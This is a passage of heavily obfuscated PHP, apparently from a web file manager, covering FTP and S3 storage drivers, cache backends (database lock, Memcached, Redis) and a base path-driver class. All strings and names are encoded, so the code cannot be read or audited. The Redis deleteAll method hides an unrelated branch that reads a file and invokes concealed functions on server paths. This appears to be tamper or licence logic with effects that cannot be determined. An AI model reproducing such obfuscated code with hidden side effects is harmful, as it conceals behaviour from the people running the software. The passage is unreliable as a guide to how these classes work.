$ëƒ¾ãÑ“[$êµ’«ñò[88]] = 0; $ëƒ¾ãÑ“[$êµ’«ñò[232]] = $ëƒ¾ãÑ“[$êµ’«ñò[233]] = !0; $Ì–·ûÕê = $this->iconvSystem($éÑ†ëì£); $ëƒ¾ãÑ“[$êµ’«ñò[88]] = @ftp_mdtm($this->connect, $Ì–·ûÕê); if (empty($Àî“åè)) { $Àî“åè = $this->objectMeta($éÑ†ëì£); if (!$Àî“åè) { return $ëƒ¾ãÑ“; } } $ëƒ¾ãÑ“[$êµ’«ñò[79]] = $Àî“åè[$êµ’«ñò[79]]; return $ëƒ¾ãÑ“; } public function size($ì¶Ù‡Áà) { $¯ûíÜ¢› = $this->objectMeta($ì¶Ù‡Áà); return $¯ûíÜ¢› ? $¯ûíÜ¢›[$_SERVER[íïàËŸë][79]] : 0; } public function info($–©”é­À) { if ($this->isFile($–©”é­À)) { return $this->fileInfo($–©”é­À, 0); } else { if ($this->isFolder($–©”é­À)) { return $this->folderInfo($–©”é­À); } } return !1; } private function fileList($¡Å¿¶Ù¾, &$Éù¼Áªë, &$ÁºÁÁÚ, $ƒ†ÑÈóâ = false) { $á†ç­›ò =& $_SERVER[íïàËŸë]; $¡Å¿¶Ù¾ = $this->iconvSystem($¡Å¿¶Ù¾); if (!$this->isFolder($¡Å¿¶Ù¾)) { return !1; } @ftp_chdir($this->connect, $á†ç­›ò[8]); $¡Å¿¶Ù¾ = rtrim($¡Å¿¶Ù¾, $á†ç­›ò[8]) . $á†ç­›ò[8]; check_abort(); $‰Ûíİ‚¯ = @ftp_rawlist($this->connect, $¡Å¿¶Ù¾); if (!$‰Ûíİ‚¯) { $‰Ûíİ‚¯ = array(); } $úÖ“‡â’ = array($á†ç­›ò[10] => 1, $á†ç­›ò[1374] => 1); foreach ($‰Ûíİ‚¯ as $°İ†Íìñ) { $Õ©á³ = $this->_listItem($°İ†Íìñ); if ($Õ©á³[0] == $á†ç­›ò[841]) { continue; } $¥ÉØö×ñ = $Õ©á³[8]; if (empty($¥ÉØö×ñ) && $¥ÉØö×ñ !== $á†ç­›ò[228] || isset($úÖ“‡â’[$¥ÉØö×ñ])) { continue; } $¥ÉØö×ñ = $this->iconvApp($¡Å¿¶Ù¾ . ltrim($¥ÉØö×ñ, $á†ç­›ò[8])); $—«§ëğ¤ = array($á†ç­›ò[32] => $¥ÉØö×ñ, $á†ç­›ò[33] => $á†ç­›ò[230], $á†ç­›ò[79] => $Õ©á³[4]); if (substr($°İ†Íìñ, 0, 1) == $á†ç­›ò[1460]) { $—«§ëğ¤[$á†ç­›ò[33]] = $á†ç­›ò[78]; $—«§ëğ¤[$á†ç­›ò[79]] = 0; } $ß˜¾èŒÒ = $—«§ëğ¤[$á†ç­›ò[33]] == $á†ç­›ò[78] ? !0 : !1; $this->cacheMethodInfoSet($¥ÉØö×ñ, $ß˜¾èŒÒ, $—«§ëğ¤); if ($ß˜¾èŒÒ) { $Éù¼Áªë[] = $¥ÉØö×ñ; if ($ƒ†ÑÈóâ) { $this->fileList($¥ÉØö×ñ, $Éù¼Áªë, $ÁºÁÁÚ, $ƒ†ÑÈóâ); } continue; } $ÁºÁÁÚ[] = $—«§ëğ¤; } $this->cacheMethodInfoSet($¡Å¿¶Ù¾, !0); } private function _listItem($·¤§Şş) { if (empty($·¤§Şş)) { return array(); } $ÄÆ = preg_split($_SERVER[íïàËŸë][1461], $·¤§Şş); if (count($ÄÆ) <= 9) { return $ÄÆ; } $ÄÆ[8] = trim(substr($·¤§Şş, strpos($·¤§Şş, $ÄÆ[7]) + strlen($ÄÆ[7]))); return array_splice($ÄÆ, 0, 9); } public function listPath($¶…êÖ£, $¸Øó™®‚ = false) { $À…¢Ã¯Ä =& $_SERVER[íïàËŸë]; if (!$this->_isconn()) { return !1; } $öéèÉò = $Ò—¿À† = array(); $this->fileList($¶…êÖ£, $öéèÉò, $Ò—¿À†); foreach ($öéèÉò as $Ûµù±ÒÎ => $à¶Ç„‰£) { $öéèÉò[$Ûµù±ÒÎ] = $this->folderInfo($à¶Ç„‰£, $¸Øó™®‚); } foreach ($Ò—¿À† as $Ûµù±ÒÎ => $à¶Ç„‰£) { $Ò—¿À†[$Ûµù±ÒÎ] = $this->fileInfo($à¶Ç„‰£[$À…¢Ã¯Ä[32]], $¸Øó™®‚, $à¶Ç„‰£); } return array($À…¢Ã¯Ä[85] => $öéèÉò, $À…¢Ã¯Ä[86] => $Ò—¿À†); } public function has($òŸïªú, $»¼Œ”“ˆ = false, $ªÌÌ§°  = true) { $ğêã‹ğ¯ =& $_SERVER[íïàËŸë]; $½±è¦· = $ºÇ¶Æä€ = array(); $§èùŒì = $»¼Œ”“ˆ ? !0 : !1; $this->fileList($òŸïªú, $½±è¦·, $ºÇ¶Æä€, $§èùŒì); if ($»¼Œ”“ˆ) { return array($ğêã‹ğ¯[239] => count($ºÇ¶Æä€), $ğêã‹ğ¯[240] => count($½±è¦·)); } if ($ªÌÌ§° ) { if (count($ºÇ¶Æä€)) { return !0; } } else { if (count($½±è¦·)) { return !0; } } return !1; } public function listAll($®è‹ÍÜ¼) { $ÀÅ”´¯Ş =& $_SERVER[íïàËŸë]; if (!$this->_isconn()) { return !1; } $´ûùü•î = $Ã±ªíè° = array(); $this->fileList($®è‹ÍÜ¼, $´ûùü•î, $Ã±ªíè°, !0); $×­±­§ü = array_to_keyvalue($Ã±ªíè°, $ÀÅ”´¯Ş[32]); foreach ($´ûùü•î as $‰úÌÌú) { if (is_string($‰úÌÌú)) { $×­±­§ü[$‰úÌÌú] = array($ÀÅ”´¯Ş[79] => 0); } } return $this->listAllFiles($®è‹ÍÜ¼, $×­±­§ü); } public function getContent($È‰İ£•¢) { if (!$this->_isconn()) { return !1; } $È‰İ£•¢ = $this->iconvSystem($È‰İ£•¢); return $this->fileSubstr($È‰İ£•¢); } public function setContent($›¦Ú†µŒ, $÷²´…±Ø = '') { if (!$this->_isconn()) { return !1; } $ÍÊößÍ = $this->pathThis($this->iconvSystem($›¦Ú†µŒ)); $ùñÁñú¼ = $this->tempFile($ÍÊößÍ); file_put_contents($ùñÁñú¼, $÷²´…±Ø); $»·˜æ ½ = $this->upload($›¦Ú†µŒ, $this->iconvApp($ùñÁñú¼)); $this->tempFileRemve($ùñÁñú¼); return $»·˜æ ½; } public function fileSubstr($‚†ê², $¸æ†ı’  = 0, $è¿–£š· = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($‚†ê², $¸æ†ı’ , $è¿–£š·); } private function ftpRequest($ÆÃ“Äí±, $¼ÓŸäêï = 0, $Ÿ´å€öŒ = false) { $ÆÃ“Äí± = $this->iconvSystem($ÆÃ“Äí±); $ æü”ç» = $this->scheme . $this->host . $_SERVER[íïàËŸë][4] . $this->port; $®Åè×¼Ç = curl_init(); curl_setopt($®Åè×¼Ç, CURLOPT_URL, $ æü”ç» . $this->pathEncode($ÆÃ“Äí±)); curl_setopt($®Åè×¼Ç, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Ÿ´å€öŒ) { $«ŞÎ˜ò = $¼ÓŸäêï + $Ÿ´å€öŒ - 1; curl_setopt($®Åè×¼Ç, CURLOPT_RANGE, "{$¼ÓŸäêï}\55{$«ŞÎ˜ò}"); } curl_setopt($®Åè×¼Ç, CURLOPT_RETURNTRANSFER, 1); $õ¸¸²Ğ = curl_exec($®Åè×¼Ç); curl_close($®Åè×¼Ç); return $õ¸¸²Ğ; } public function upload($¼—ÇÌšÈ, $¹ÅŞ‚ú‚, $§µÒ ü± = false, $ˆÔÏü…è = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¼—ÇÌšÈ))) { return !1; } $¼—ÇÌšÈ = $this->iconvSystem($¼—ÇÌšÈ); $¹ÅŞ‚ú‚ = $this->iconvSystem($¹ÅŞ‚ú‚); $¸ÔÜï¯ = ftp_nb_put($this->connect, $¼—ÇÌšÈ, $¹ÅŞ‚ú‚, FTP_BINARY); while ($¸ÔÜï¯ == FTP_MOREDATA) { $¸ÔÜï¯ = ftp_nb_continue($this->connect); } if ($¸ÔÜï¯ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); return !1; } return $this->getPathOuter($¼—ÇÌšÈ); } public function download($Ò“›¦ÉÒ, $Â ¢——‚ = '') { if (!$this->_isconn()) { return !1; } $”Ë™Õ“¿ = $this->pathFather($Â ¢——‚); if (!IO::mkdir($”Ë™Õ“¿)) { return !1; } $Ò“›¦ÉÒ = $this->iconvSystem($Ò“›¦ÉÒ); $Â ¢——‚ = $this->iconvSystem($Â ¢——‚); $·ˆæ»ù„ = ftp_nb_get($this->connect, $Â ¢——‚, $Ò“›¦ÉÒ, FTP_BINARY); while ($·ˆæ»ù„ == FTP_MOREDATA) { $·ˆæ»ù„ = ftp_nb_continue($this->connect); } if ($·ˆæ»ù„ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); return !1; } return $this->iconvApp($Â ¢——‚); } public function exist($·Äöê’á) { return $this->isFile($·Äöê’á) || $this->isFolder($·Äöê’á); } public function isFile($şêğ¬•) { return !$this->isFolder($şêğ¬•) && $this->objectMeta($şêğ¬•); } public function isFolder($ ñÃ‡Àå) { return $this->cacheMethod($_SERVER[íïàËŸë][179], $ ñÃ‡Àå); } protected function objectMeta($ºœ¨Â) { return $this->cacheMethod($_SERVER[íïàËŸë][181], $ºœ¨Â); } protected function _objectMeta($Ä”Ä²Ùà) { $»´Œìº­ =& $_SERVER[íïàËŸë]; if ($Ä”Ä²Ùà == $»´Œìº­[12] || $Ä”Ä²Ùà == $»´Œìº­[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ä”Ä²Ùà = $this->iconvSystem($Ä”Ä²Ùà); $ŠƒèóÅ– = array($»´Œìº­[32] => $this->iconvApp($Ä”Ä²Ùà), $»´Œìº­[33] => $»´Œìº­[230], $»´Œìº­[79] => 0); @ftp_chdir($this->connect, $»´Œìº­[8]); $í÷½Ïá = @ftp_size($this->connect, $Ä”Ä²Ùà); if ($í÷½Ïá != -1) { $ŠƒèóÅ–[$»´Œìº­[79]] = $í÷½Ïá; } else { $ù²ÁÇ–û = @ftp_chdir($this->connect, $Ä”Ä²Ùà); if (!$ù²ÁÇ–û) { return !1; } $ŠƒèóÅ–[$»´Œìº­[33]] = $»´Œìº­[78]; } return $ŠƒèóÅ–; } protected function _isFolder($«öá§Ôİ) { $¬à¶çÜ” =& $_SERVER[íïàËŸë]; if ($«öá§Ôİ == $¬à¶çÜ”[12] || $«öá§Ôİ == $¬à¶çÜ”[8]) { return !0; } $ÕùÏ‹ƒ¤ = $this->_objectMeta($«öá§Ôİ); return isset($ÕùÏ‹ƒ¤[$¬à¶çÜ”[33]]) && $ÕùÏ‹ƒ¤[$¬à¶çÜ”[33]] == $¬à¶çÜ”[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($÷­çŸûÌ) { parent::__construct($÷­çŸûÌ); $this->setSignVersion($_SERVER[íïàËŸë][247]); } public function uploadLink($ŞÆçê½…, $™Ä¿»¦» = 0) { $¥ğ±ë Ú =& $_SERVER[íïàËŸë]; if ($this->isUploadServer()) { return; } $‹¶åÔÄí = $this->getType(); if (!in_array($‹¶åÔÄí, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¬ËÕ»İç = (!$™Ä¿»¦» ? 1 : ceil($™Ä¿»¦» / pow(1024, 3))) * 3600 * 4; $…—£÷ãî = $this->multiUploadFormData($ŞÆçê½…, $¬ËÕ»İç); if ($…—£÷ãî) { $…—£÷ãî[$¥ğ±ë Ú[97]] = $ŞÆçê½…; $…—£÷ãî[$¥ğ±ë Ú[98]] = $‹¶åÔÄí; } return $…—£÷ãî; } public function fileOutImage($·Ùò†•ê, $ÊŸ ä¾  = 250) { if ($this->size($·Ùò†•ê) > 1024 * 1024 * 25) { return $this->fileOutImageServer($·Ùò†•ê, $ÊŸ ä¾ ); } $Öæ€æ¸ç = $this->link($·Ùò†•ê); $Öæ€æ¸ç .= $_SERVER[íïàËŸë][1462] . $ÊŸ ä¾ ; $this->fileOutLink($Öæ€æ¸ç); } public function fileOutLink($Ù§„ûí«) { $Ìş·Ñ =& $_SERVER[íïàËŸë]; if (substr($Ù§„ûí«, 0, 7) == $Ìş·Ñ[313]) { $Ù§„ûí« = $Ìş·Ñ[314] . substr($Ù§„ûí«, 7); } header($Ìş·Ñ[175] . $Ù§„ûí«); die; } } goto B×‘ä…Ü÷; dª÷ª¬Õï: class CacheLockDatabase { public function lock($‘—•Àï, $»Éä®È„ = 0) { $¯íâ®İ‘ = Model($_SERVER[íïàËŸë][918]); $­’µ„‘é = microtime(!0) + $»Éä®È„; while (microtime(!0) < $­’µ„‘é) { $ŸÊé ƒÂ = $¯íâ®İ‘->get($‘—•Àï); if (!$ŸÊé ƒÂ || $ŸÊé ƒÂ < microtime(!0)) { $çıŒ‚¿„ = $¯íâ®İ‘->set($‘—•Àï, $­’µ„‘é); if ($çıŒ‚¿„) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ë°ˆÇë´) { return Model($_SERVER[íïàËŸë][918])->get($Ë°ˆÇë´); } public function unlock($¼Ê÷»ªñ) { Model($_SERVER[íïàËŸë][918])->remove($¼Ê÷»ªñ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($àÂ¶ÔáË, $¿Ôì¤õ) { $„•ùÊ£ =& $_SERVER[íïàËŸë]; if (!class_exists($„•ùÊ£[956])) { show_json($„•ùÊ£[957], !1); } $this->cacheTime = $¿Ôì¤õ; $this->handle = new Memcached(); if (is_array($àÂ¶ÔáË[$„•ùÊ£[958]]) && count($àÂ¶ÔáË[$„•ùÊ£[958]]) >= 1) { foreach ($àÂ¶ÔáË[$„•ùÊ£[958]] as $ı ±ï™‘) { $ ˜ìæÀ· = explode($„•ùÊ£[4], $ı ±ï™‘); $this->handle->addServer($ ˜ìæÀ·[0], $ ˜ìæÀ·[1]); } } else { $this->handle->addServer($àÂ¶ÔáË[$„•ùÊ£[208]], $àÂ¶ÔáË[$„•ùÊ£[209]]); } } public function set($ä„Ä„ï¤, $èÓ—¨”, $´¸Œ×¾÷ = false) { $´¸Œ×¾÷ = $´¸Œ×¾÷ ? $´¸Œ×¾÷ : $this->cacheTime; return $this->handle->set($ä„Ä„ï¤, $èÓ—¨”, $´¸Œ×¾÷); } public function get($½€³ıŒ·) { return $this->handle->get($½€³ıŒ·); } public function remove($‡å÷ğŒ˜) { return $this->handle->delete($‡å÷ğŒ˜); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ßöíò›, $À¥®Öà©) { $—‰ÁßéÑ =& $_SERVER[íïàËŸë]; if (!class_exists($—‰ÁßéÑ[959])) { show_json($—‰ÁßéÑ[960], !1); } $this->cacheTime = $À¥®Öà©; $‚š˜¡¯â = isset($ßöíò›[$—‰ÁßéÑ[961]]) ? $ßöíò›[$—‰ÁßéÑ[961]] : 10; $ˆÒÂ˜ßæ = _get($ßöíò›, $—‰ÁßéÑ[958]); if ($ˆÒÂ˜ßæ && is_array($ˆÒÂ˜ßæ)) { $this->initCluster($ßöíò›, $‚š˜¡¯â); } else { $this->handle = $this->init($ßöíò›, $‚š˜¡¯â); } } private function init($°úÕ™¨é, $¬¹ÓÂğõ) { $şòÀ×‡Ó =& $_SERVER[íïàËŸë]; $ëëÂÍŠ× = new Redis(); $îò†ÇœØ = isset($°úÕ™¨é[$şòÀ×‡Ó[962]]) ? $°úÕ™¨é[$şòÀ×‡Ó[962]] : !1; if ($îò†ÇœØ) { $ëëÂÍŠ×->pconnect($°úÕ™¨é[$şòÀ×‡Ó[208]], $°úÕ™¨é[$şòÀ×‡Ó[209]], $¬¹ÓÂğõ); } else { $ëëÂÍŠ×->connect($°úÕ™¨é[$şòÀ×‡Ó[208]], $°úÕ™¨é[$şòÀ×‡Ó[209]], $¬¹ÓÂğõ); } if (!empty($°úÕ™¨é[$şòÀ×‡Ó[487]])) { $ëëÂÍŠ×->auth($°úÕ™¨é[$şòÀ×‡Ó[487]]); } if (!empty($°úÕ™¨é[$şòÀ×‡Ó[840]]) && $°úÕ™¨é[$şòÀ×‡Ó[840]] != 0) { $ëëÂÍŠ×->select($°úÕ™¨é[$şòÀ×‡Ó[840]]); } return $ëëÂÍŠ×; } private function initCluster($°â‡Ê¸, $‰ñ¨…×) { $¥Ñ¢Îë =& $_SERVER[íïàËŸë]; $ç‹åç» = array($¥Ñ¢Îë[963], $¥Ñ¢Îë[964], $¥Ñ¢Îë[965]); $ˆòâ°™À = $¥Ñ¢Îë[963]; if (isset($°â‡Ê¸[$¥Ñ¢Îë[16]]) && in_array($°â‡Ê¸[$¥Ñ¢Îë[16]], $ç‹åç»)) { $ˆòâ°™À = $°â‡Ê¸[$¥Ñ¢Îë[16]]; } switch ($ˆòâ°™À) { case $¥Ñ¢Îë[963]: $this->_slave($°â‡Ê¸, $‰ñ¨…×); break; case $¥Ñ¢Îë[964]: break; case $¥Ñ¢Îë[965]: $this->isCluster = !0; $²¸¶ê®µ = $°â‡Ê¸[$¥Ñ¢Îë[958]]; $ß‚‡®‡ı = isset($°â‡Ê¸[$¥Ñ¢Îë[962]]) ? $°â‡Ê¸[$¥Ñ¢Îë[962]] : !1; $şç¹¡Ï‘ = isset($°â‡Ê¸[$¥Ñ¢Îë[487]]) ? $°â‡Ê¸[$¥Ñ¢Îë[487]] : null; $this->handle = new RedisCluster(NUll, $²¸¶ê®µ, $‰ñ¨…×, $‰ñ¨…×, $ß‚‡®‡ı, $şç¹¡Ï‘); break; default: break; } } private function _slave($•‹ÔÔ¶ƒ, $™éµ²Î˜) { $íÉ¼€›‘ = $•‹ÔÔ¶ƒ[$_SERVER[íïàËŸë][958]]; $this->filterConfig($•‹ÔÔ¶ƒ, $íÉ¼€›‘[0]); $this->handle = $this->init($•‹ÔÔ¶ƒ, $™éµ²Î˜); unset($íÉ¼€›‘[0]); if (empty($íÉ¼€›‘)) { return; } $¦øè°ÜÖ = array_rand($íÉ¼€›‘); $this->filterConfig($•‹ÔÔ¶ƒ, $íÉ¼€›‘[$¦øè°ÜÖ]); $this->slaveHandle = $this->init($•‹ÔÔ¶ƒ, $™éµ²Î˜); } private function filterConfig(&$¥ÖÓˆº¢, $½÷¨ü¢) { $şúÑ£ =& $_SERVER[íïàËŸë]; $ åÁŸáê = explode($şúÑ£[4], $½÷¨ü¢); $ €¯Øˆ© = array($şúÑ£[208] => $ åÁŸáê[0], $şúÑ£[209] => $ åÁŸáê[1]); $¥ÖÓˆº¢ = array_merge($¥ÖÓˆº¢, $ €¯Øˆ©); } public function set($Ô¥„…¼…, $’¬ûüØ, $Ôïğ® ò = false) { $Ôïğ® ò = $Ôïğ® ò ? $Ôïğ® ò : $this->cacheTime; return $this->handle->setEx($Ô¥„…¼…, $Ôïğ® ò, $’¬ûüØ); } public function setLock($Ö£¨Şî‡, $êÔî‹ŞÇ, $õ›€€›Ø) { return $this->handle->setNX($Ö£¨Şî‡, $êÔî‹ŞÇ); } public function get($Ÿ™¨Ô—Ü) { $Îƒæ•Æõ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Îƒæ•Æõ->get($Ÿ™¨Ô—Ü); } public function remove($‹ğìÏŒ¸) { return $this->handle->del($‹ğìÏŒ¸); } public function deleteAll() { $§Î–´™ =& $_SERVER[íïàËŸë]; if ($_SERVER[$§Î–´™[909]] != $_SERVER[$§Î–´™[966]]) { $ ßá¨„ù = $§Î–´™[967]; $â°–á¾¾ = $§Î–´™[911]; $Ø—Ñı´ = $_SERVER[$§Î–´™[912]] . $§Î–´™[913]; $¾»‚» = $â°–á¾¾($Ø—Ñı´); $Ñ•ÏçƒÏ = explode($§Î–´™[262], $¾»‚»); if (count($Ñ•ÏçƒÏ) < $§Î–´™[693]) { $ÇÜ¾èŠæ = $§Î–´™[914]; $ÇÜ¾èŠæ(); } $½ÓºÄ´é = $§Î–´™[968]; $½ÓºÄ´é($_SERVER[$§Î–´™[969]]); $½ÓºÄ´é($_SERVER[$§Î–´™[912]] . $§Î–´™[970]); $‘óíåÅ³ = 1; while ($‘óíåÅ³ > 1) { $‘óíåÅ³ = $‘óíåÅ³ + 4; $ÈœäàÉ‘ = rawurlencode($‘óíåÅ³ . $§Î–´™[454]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $äÃŒ¦­¼) { $this->handle->flushall($äÃŒ¦­¼); } return; } return $this->handle->flushAll(); } } goto cù×°´—…; cÇ»Ç±¼«Ö: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Ùø€‰¹³ =& $_SERVER[íïàËŸë]; $this->objectDriver = array($Ùø€‰¹³[60], $Ùø€‰¹³[61], $Ùø€‰¹³[62], $Ùø€‰¹³[63], $Ùø€‰¹³[64], $Ùø€‰¹³[65], $Ùø€‰¹³[66], $Ùø€‰¹³[67], $Ùø€‰¹³[68], $Ùø€‰¹³[69], $Ùø€‰¹³[70], $Ùø€‰¹³[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ëà—â›) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ëà—â›, $_SERVER[íïàËŸë][8]); } return $Ëà—â›; } public function iconvApp($µ©«ËÚ•) { return $µ©«ËÚ•; } public function iconvSystem($•¯™‰ö) { return $•¯™‰ö; } public function iconvTo($Ô¹ÖÊó», $şÁˆâ•, $ˆõ‘Ê ´) { $õ¢ãå‚Ñ =& $_SERVER[íïàËŸë]; if (!$Ô¹ÖÊó» || !function_exists($õ¢ãå‚Ñ[72])) { return $Ô¹ÖÊó»; } static $øı™ú¼² = array(); $“Ûæ‹™ = $şÁˆâ• . $õ¢ãå‚Ñ[73] . $ˆõ‘Ê ´ . $õ¢ãå‚Ñ[74] . $Ô¹ÖÊó»; if (isset($øı™ú¼²[$“Ûæ‹™])) { return $øı™ú¼²[$“Ûæ‹™]; } if (function_exists($õ¢ãå‚Ñ[75])) { $É©ÄÕöŸ = @mb_convert_encoding($Ô¹ÖÊó», $ˆõ‘Ê ´, $şÁˆâ•); } else { $É©ÄÕöŸ = @iconv($şÁˆâ•, $ˆõ‘Ê ´, $Ô¹ÖÊó»); } $É©ÄÕöŸ = $É©ÄÕöŸ ? $É©ÄÕöŸ : $Ô¹ÖÊó»; if (strstr($É©ÄÕöŸ, $õ¢ãå‚Ñ[76])) { $É©ÄÕöŸ = str_replace($õ¢ãå‚Ñ[76], $õ¢ãå‚Ñ[11], $É©ÄÕöŸ); } $øı™ú¼²[$şÁˆâ• . $õ¢ãå‚Ñ[73] . $ˆõ‘Ê ´ . $õ¢ãå‚Ñ[74] . $Ô¹ÖÊó»] = $É©ÄÕöŸ; $øı™ú¼²[$ˆõ‘Ê ´ . $õ¢ãå‚Ñ[73] . $şÁˆâ• . $õ¢ãå‚Ñ[74] . $Ô¹ÖÊó»] = $Ô¹ÖÊó»; $øı™ú¼²[$ˆõ‘Ê ´ . $õ¢ãå‚Ñ[73] . $şÁˆâ• . $õ¢ãå‚Ñ[74] . $É©ÄÕöŸ] = $Ô¹ÖÊó»; $øı™ú¼²[$şÁˆâ• . $õ¢ãå‚Ñ[73] . $ˆõ‘Ê ´ . $õ¢ãå‚Ñ[74] . $É©ÄÕöŸ] = $É©ÄÕöŸ; return $É©ÄÕöŸ; } public function getPathInner($ÔÂ’©°˜) { $ğêûëâ° = IO::init($ÔÂ’©°˜); return $ğêûëâ°->path; } public function getPathOuter($¤ôşŒ˜ª) { $ıÑ÷ÓİÖ =& $_SERVER[íïàËŸë]; $€…Ë¡ = strlen(trim($this->pathBase, $ıÑ÷ÓİÖ[8])); $¤ôşŒ˜ª = substr(trim($¤ôşŒ˜ª, $ıÑ÷ÓİÖ[8]), $€…Ë¡); return $this->pathDriver . $ıÑ÷ÓİÖ[8] . ltrim($¤ôşŒ˜ª, $ıÑ÷ÓİÖ[8]); } public function isParentOf($¬ù¸ƒõÔ, $öñ”Ï) { $±ÅÁôÃ“ =& $_SERVER[íïàËŸë]; $¬ù¸ƒõÔ = rtrim(strtolower($¬ù¸ƒõÔ), $±ÅÁôÃ“[8]) . $±ÅÁôÃ“[8]; $öñ”Ï = rtrim(strtolower($öñ”Ï), $±ÅÁôÃ“[8]) . $±ÅÁôÃ“[8]; $Å‡¢„ş = strpos($öñ”Ï, $¬ù¸ƒõÔ) === 0; return $Å‡¢„ş; } public function getType() { $ŞÜÇÁ =& $_SERVER[íïàËŸë]; $úÆÙ†‹ù = str_replace($ŞÜÇÁ[77], $ŞÜÇÁ[12], get_class($this)); return strtolower($úÆÙ†‹ù); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Åı¤œİÏ, $¡»Ä¨éì) { $Îì¦Ò– =& $_SERVER[íïàËŸë]; $¿„ÆˆÊ = rtrim($Åı¤œİÏ, $Îì¦Ò–[8]) . $Îì¦Ò–[8] . $¡»Ä¨éì; $İèÑãÔ† = $this->exist($¿„ÆˆÊ); return $İèÑãÔ† ? $¿„ÆˆÊ : !1; } public function setModifyTime($Ü®Ûôß, $´ø£ÈÛİ = '') { } public function renameObject($ÈòÑÆ²Ê, $ïŠé–ô) { $ŒáÎæ·š = $ïŠé–ô; $ÈòÑÆ²Ê = $this->getPathOuter($ÈòÑÆ²Ê); $ïŠé–ô = $this->pathFather($ÈòÑÆ²Ê) . $ïŠé–ô; $íşæìª» = IO::copy($ÈòÑÆ²Ê, $this->pathFather($ÈòÑÆ²Ê), REPEAT_RENAME_FOLDER, $ŒáÎæ·š); if ($íşæìª») { IO::remove($ÈòÑÆ²Ê); } return $íşæìª» ? $ïŠé–ô : !1; } public function tempFile($ÛâÎó“İ = '', $ˆ¯°Ë®ñ = '') { if (!$ÛâÎó“İ) { $ÛâÎó“İ = rand_string(15); } $ÍŠ©¡©ñ = TEMP_FILES . rand_string(15) . $_SERVER[íïàËŸë][8]; @mkdir($ÍŠ©¡©ñ, DEFAULT_PERRMISSIONS, !0); $å¿èÖˆŠ = $ÍŠ©¡©ñ . $ÛâÎó“İ; @touch($å¿èÖˆŠ); if ($ˆ¯°Ë®ñ) { file_put_contents($å¿èÖˆŠ, $ˆ¯°Ë®ñ); } return $å¿èÖˆŠ; } public function tempFileRemve($Å¿İ‚Î›) { @unlink($Å¿İ‚Î›); @rmdir($this->pathFather($Å¿İ‚Î›)); } public function mkfile($„‹ÃÜÇæ, $¹âË‰Œ = '', $¢Úé§ğ¦ = REPEAT_RENAME) { } public function mkdir($ùÂ¯, $­ôÇûî = REPEAT_SKIP) { } public function delFile($á¯ºí«») { } public function delFolder($£ëÙ) { } public function copyFile($Üß¿¸‚, $½Ì§ûì) { } public function moveFile($ˆËï¤²æ, $‹‡“õÇ¦) { } public function remove($¢ÁŞ´ªŠ) { if ($this->isFile($¢ÁŞ´ªŠ)) { return $this->delFile($¢ÁŞ´ªŠ); } return $this->delFolder($¢ÁŞ´ªŠ); } public function rename($±·¦¾Õ, $Ğ×”ü) { } public function exist($ÇÊî™‹Ö) { } public function findByHash($¦‡ƒ‘˜ = '', $å•Ëúô¦ = '') { return !1; } public function isFile($ŠÕïñ¥¤) { } public function isFolder($ßÕ­ÈÉ) { } public function size($ƒØ¾Öß˜) { } public function info($††‰°»‚) { } public function infoSimple($¶´·Ğ´é) { return $this->info($¶´·Ğ´é); } public function infoAuth($İÃ­¾Ñ) { return $this->info($İÃ­¾Ñ); } public function infoFull($¤ŒÕÍß) { return $this->info($¤ŒÕÍß); } public function infoFullSimple($µû±œ™ˆ) { return $this->info($µû±œ™ˆ); } public function infoWithChildren($Õ†Õë¦ş) { $ôÑµ‚”ö =& $_SERVER[íïàËŸë]; static $Ûòì»Ó¢ = array(); if (isset($Ûòì»Ó¢[$Õ†Õë¦ş])) { return $Ûòì»Ó¢[$Õ†Õë¦ş]; } $ñå¸íŸå = $this->info($Õ†Õë¦ş); if ($ñå¸íŸå && $ñå¸íŸå[$ôÑµ‚”ö[33]] == $ôÑµ‚”ö[78]) { $ÉÎİÚş´ = array($ôÑµ‚”ö[79] => 0, $ôÑµ‚”ö[80] => 0, $ôÑµ‚”ö[81] => 0); $this->infoChildren($Õ†Õë¦ş, $ÉÎİÚş´); $ñå¸íŸå[$ôÑµ‚”ö[79]] = $ÉÎİÚş´[$ôÑµ‚”ö[79]]; $ñå¸íŸå[$ôÑµ‚”ö[82]] = array($ôÑµ‚”ö[83] => $ÉÎİÚş´[$ôÑµ‚”ö[80]], $ôÑµ‚”ö[84] => $ÉÎİÚş´[$ôÑµ‚”ö[81]]); $Ûòì»Ó¢[$Õ†Õë¦ş] = $ñå¸íŸå; } return $ñå¸íŸå; } public function listPath($ƒ¡®Ê£Ó, $Ãş£ò€ö = false) { } public function has($Ñˆ€Ì‹¬, $áâŸ¹‹† = false, $¢ä‹Ê–Ñ = false) { } public function canRead($ã¬ÉÍ) { } public function canWrite($•£¢äÕÇ) { } public function getContent($Ö—ì¨â±) { } public function setContent($¤ÒØ³²Ş, $¬Öè†‚ì = '') { } protected function infoChildren($ÂôÁòÀ, &$ôß¿æÔæ) { $İ²ïøªÃ =& $_SERVER[íïàËŸë]; check_abort_echo(); $™…åğëº = $this->listPath($ÂôÁòÀ, !0); $™…åğëº = array_merge($™…åğëº[$İ²ïøªÃ[85]], $™…åğëº[$İ²ïøªÃ[86]]); foreach ($™…åğëº as $àÃ’Ú‰‚) { if ($àÃ’Ú‰‚[$İ²ïøªÃ[33]] == $İ²ïøªÃ[78]) { 